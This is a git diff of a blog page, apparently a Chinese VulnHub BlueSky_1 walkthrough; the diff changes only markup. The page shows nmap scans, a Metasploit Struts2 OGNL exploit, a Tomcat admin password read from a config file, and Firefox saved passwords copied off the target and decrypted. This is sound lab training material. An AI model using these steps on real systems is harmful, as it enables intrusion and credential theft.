@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.83.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.87.0" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -14,7 +14,7 @@
 
     <title>[vulnhub]BlueSky_1 | tyskillのBlog</title>
 
-    <link rel="stylesheet" href="/css/meme.min.09e7384df2ebf8f7760291a0d443770f44b39f5563546dd950293ed79e8d779b.css"/>
+    <link rel="stylesheet" href="/css/meme.min.12acc0ca7f74225e7b015741d28e3038696047c86698a0fb722ce126d04c739e.css"/>
 
     
     
@@ -276,26 +276,26 @@
 <p>先探测主机存活：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nmap -sP 192.168.150.128/24
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nmap -sP 192.168.150.128/24
 </code></pre></td></tr></table></div>
 </div>
 </div><p>获得靶机地址<code>192.168.150.129</code></p>
 <p>然后进行端口扫描获得服务信息：</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">nmap --min-rate <span class="m">10000</span> -T4 -A 192.168.150.129
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">nmap --min-rate <span class="m">10000</span> -T4 -A 192.168.150.129
 </code></pre></td></tr></table></div>
 </div>
 </div><p>扫描结果</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt"> 1
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
 </span><span class="lnt"> 2
 </span><span class="lnt"> 3
 </span><span class="lnt"> 4
@@ -307,7 +307,7 @@
 </span><span class="lnt">10
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">PORT     STATE SERVICE VERSION
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">PORT     STATE SERVICE VERSION
 22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
 <span class="p">|</span> ssh-hostkey: 
 <span class="p">|</span>   <span class="m">2048</span> 19:45:ec:5c:59:46:c8:26:b5:a3:30:d9:2f:79:ac:85 <span class="o">(</span>RSA<span class="o">)</span>
@@ -329,7 +329,7 @@ Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 <p>参考<a href="https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/struts2_content_type_ognl.md" target="_blank" rel="noopener">https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/struts2_content_type_ognl.md</a></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
@@ -337,7 +337,7 @@ Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
 </span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">use exploit/multi/http/struts2_content_type_ognl
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">use exploit/multi/http/struts2_content_type_ognl
 show options <span class="c1"># 查看配置</span>
 <span class="nb">set</span> RHOSTS 192.168.150.129 <span class="c1"># 设置靶机地址</span>
 <span class="nb">set</span> RPORT <span class="m">8080</span>             <span class="c1"># 设置靶机端口</span>
@@ -351,10 +351,10 @@ run
 <p>读取tomcat用户配置文件(<code>/usr/local/tomcat/conf/tomcat-users.xml</code>)获得管理员账号</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">&#34;admin&#34;</span> <span class="na">password=</span><span class="s">&#34;6mzf3&gt;gfZ.pN8_Mp&#34;</span> <span class="na">roles=</span><span class="s">&#34;manager-gui&#34;</span><span class="nt">/&gt;</span>
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="nt">&lt;user</span> <span class="na">username=</span><span class="s">&#34;admin&#34;</span> <span class="na">password=</span><span class="s">&#34;6mzf3&gt;gfZ.pN8_Mp&#34;</span> <span class="na">roles=</span><span class="s">&#34;manager-gui&#34;</span><span class="nt">/&gt;</span>
 </code></pre></td></tr></table></div>
 </div>
 </div><p>登录tomcat管理员，管理员拥有删除目录和上传war包添加目录等权限。</p>
@@ -380,13 +380,13 @@ run
 <p>1、由于靶机没有git，所以只能下载靶机文件到本地</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span><span class="lnt">2
 </span><span class="lnt">3
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 靶机</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1"># 靶机</span>
 python3 -m http.server <span class="m">8090</span> <span class="c1"># 在8090开启web服务</span>
 <span class="c1"># 攻击机</span>
 wget -r 192.168.150.129:8090/ <span class="c1"># 下载靶机firefox目录文件</span>
@@ -395,10 +395,10 @@ wget -r 192.168.150.129:8090/ <span class="c1"># 下载靶机firefox目录文件
 </div><p>2、使用firefox_decrypt解密</p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre class="chroma"><code><span class="lnt">1
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre class="chroma"><code class="language-bash" data-lang="bash">python3 firefox_decrypt-master/firefox_decrypt.py 192.168.150.129:8090/
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 firefox_decrypt-master/firefox_decrypt.py 192.168.150.129:8090/
 </code></pre></td></tr></table></div>
 </div>
 </div><p>获得密码<code>skysayohyeah</code></p>
